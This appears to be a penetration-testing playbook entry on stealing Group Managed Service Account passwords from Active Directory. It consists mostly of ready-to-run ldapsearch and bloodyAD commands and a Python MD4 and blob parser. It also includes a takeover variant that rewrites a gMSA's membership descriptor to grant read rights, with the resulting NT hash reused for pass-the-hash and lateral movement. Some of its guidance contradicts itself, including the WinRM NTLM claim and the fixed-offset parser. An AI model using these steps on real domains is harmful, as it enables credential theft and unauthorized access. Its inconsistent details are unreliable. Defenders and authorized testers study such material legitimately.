# gMSA Password Extraction

## When this applies

- AD environment with a Group Managed Service Account (gMSA, `*$` account in `CN=Managed Service Accounts`).
- Your principal is in the gMSA's `msDS-GroupMSAMembership` (or you have `GenericWrite` on the gMSA — see takeover variant below).
- Goal: read the managed password blob, derive the NT hash, use it to authenticate as the service account.

## Technique

The DC stores gMSA passwords as a binary `msDS-ManagedPassword` blob. Members of `msDS-GroupMSAMembership` can read it. Parse the blob → UTF-16LE password → MD4 → NT hash. Use the NT hash for PtH against WinRM, SMB, MSSQL, etc.

## Steps

```bash
# If your account is in the gMSA's msDS-GroupMSAMembership, read the managed password
ldapsearch -H ldap://DC -Y GSSAPI -Q -b "CN=gMSA_ACCOUNT,CN=Managed Service Accounts,DC=domain,DC=com" msDS-ManagedPassword
# Parse the msDS-ManagedPassword blob (binary):
#   Offset 8-10: CurrentPasswordOffset (LE uint16)
#   Offset 10-12: OldPasswordOffset (LE uint16)
#   Password bytes: blob[CurrentPwOffset : OldPwOffset - 2]  (exclude null terminator)
#   NT hash = MD4(password_bytes)
# CRITICAL: Use (OldPwOffset - CurrentPwOffset - 2) bytes. Including the null terminator produces a WRONG hash.

# === When LDAPS is NOT configured on the DC (common in lab/legacy environments) ===
# gMSADumper.py REQUIRES TLS — it will fail with "ldaps://..." connection errors
# or "the server requires LDAPS" because msDS-ManagedPassword is a confidential
# attribute (LDAP_SERVER_SD_FLAGS / encrypt-or-fail).
# bloodyAD uses NTLM-signed LDAP, which AD treats as encrypted and serves the attribute:
bloodyAD --host DC_FQDN -d domain.local -u <user> -p '<pass>' \
  get object 'gMSA_ACCOUNT$' --attr msDS-ManagedPassword
# bloodyAD prints the parsed NT hash directly (no manual blob parsing).
# Works with -k (Kerberos via ccache) or -p (NTLM password) — both signed bindings.
# If LDAPS is up: gMSADumper.py also works:
#   gMSADumper.py -u <user> -p <pass> -d domain.local -l DC_IP
```

## Verifying success

- `bloodyAD ... get object ... --attr msDS-ManagedPassword` outputs the parsed NT hash.
- `nxc winrm DC -u 'gMSA_ACCOUNT$' -H <NT_hash>` authenticates successfully (gMSA accounts require Kerberos for some services — see WinRM gotchas).

## Common pitfalls

- `gMSADumper.py` requires LDAPS — falls over silently in legacy/lab environments without TLS configured. Use `bloodyAD` (NTLM-signed) instead.
- Including the null terminator in MD4 input produces a WRONG hash. Use `(OldPwOffset - CurrentPwOffset - 2)` bytes.
- gMSA accounts require Kerberos auth for WinRM — NTLM auth returns Access Denied.

## GenericWrite Takeover Variant — `msDS-GroupMSAMembership`

When you have `GenericWrite` on a gMSA but are NOT in its `msDS-GroupMSAMembership`:

```bash
# Overwrite the membership SD to grant yourself read-password rights
# bloodyAD is the simplest approach (avoids raw impacket LDAP modify complexity):

# 1. Read current membership (may be empty or restricted)
bloodyAD -d domain -i DC_IP -k ccache=user.ccache --host DC_FQDN get object 'gMSA_ACCOUNT$' --attr msDS-GroupMSAMembership

# 2. Build a Security Descriptor granting your SID full control, base64-encode it
# Use impacket's SR_SECURITY_DESCRIPTOR with ACCESS_ALLOWED_ACE for your SID

# 3. Overwrite the attribute with bloodyAD (raw base64 SD)
bloodyAD -d domain -i DC_IP -k ccache=user.ccache --host DC_FQDN set object 'gMSA_ACCOUNT$' msDS-GroupMSAMembership --raw --b64 -v '<base64_SD>'

# 4. Now read the managed password (you're in the membership)
bloodyAD -d domain -i DC_IP -k ccache=user.ccache --host DC_FQDN get object 'gMSA_ACCOUNT$' --attr msDS-ManagedPassword
# Extract NT hash from the blob as above
# Chain: GenericWrite → membership overwrite → gMSA NT hash → WinRM/lateral movement
```

## `msDS-ManagedPassword` parser without samba `drsblobs`

When samba python lacks `drsblobs.MSDS_MANAGEDPASSWORD_BLOB` (older builds), parse the blob manually:

```python
import struct, binascii
def md4(message: bytes) -> bytes:
    """Pure-Python MD4 (hashlib dropped MD4 in Python 3.10)."""
    h = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
    ml = len(message) * 8
    message = bytearray(message); message.append(0x80)
    while len(message) % 64 != 56: message.append(0)
    message += struct.pack("<Q", ml & 0xffffffffffffffff)
    for cs in range(0, len(message), 64):
        X = list(struct.unpack("<16I", message[cs:cs+64])); a,b,c,d = h
        F = lambda x,y,z: (x & y) | ((~x) & 0xffffffff & z)
        G = lambda x,y,z: (x & y) | (x & z) | (y & z)
        H = lambda x,y,z: x ^ y ^ z
        rl = lambda x,n: ((x << n) | (x >> (32-n))) & 0xffffffff
        for k,s in [(i, [3,7,11,19][i%4]) for i in range(16)]:
            a,b,c,d = d, rl((a + F(b,c,d) + X[k]) & 0xffffffff, s), b, c
        for k,s in [(0,3),(4,5),(8,9),(12,13),(1,3),(5,5),(9,9),(13,13),
                    (2,3),(6,5),(10,9),(14,13),(3,3),(7,5),(11,9),(15,13)]:
            a,b,c,d = d, rl((a + G(b,c,d) + X[k] + 0x5A827999) & 0xffffffff, s), b, c
        for k,s in [(0,3),(8,9),(4,11),(12,15),(2,3),(10,9),(6,11),(14,15),
                    (1,3),(9,9),(5,11),(13,15),(3,3),(11,9),(7,11),(15,15)]:
            a,b,c,d = d, rl((a + H(b,c,d) + X[k] + 0x6ED9EBA1) & 0xffffffff, s), b, c
        h = [(h[0]+a)&0xffffffff,(h[1]+b)&0xffffffff,(h[2]+c)&0xffffffff,(h[3]+d)&0xffffffff]
    return struct.pack("<4I", *h)

def parse_managed_password(blob: bytes) -> bytes:
    """Return the current 256-byte UTF-16LE password buffer."""
    # Format: version(2)+reserved(2)+length(4)+current_pwd_off(2)+prev_pwd_off(2)+...
    # Current password starts at offset 16 (typical), 256 bytes UTF-16LE
    return blob[16:16+256]

# Usage after LDAP read of msDS-ManagedPassword:
nt_hash = binascii.hexlify(md4(parse_managed_password(blob))).decode()
# nt_hash is the gMSA's NT hash for PtH (LM hash is empty: aad3b435b51404eeaad3b435b51404ee)
```

This avoids the samba dependency entirely — useful when you're on a constrained foothold (BSD, Alpine, minimal container) where samba python isn't available.

## Tools

- bloodyAD
- gMSADumper.py
- ldapsearch (with GSSAPI)
- impacket (for SD construction)
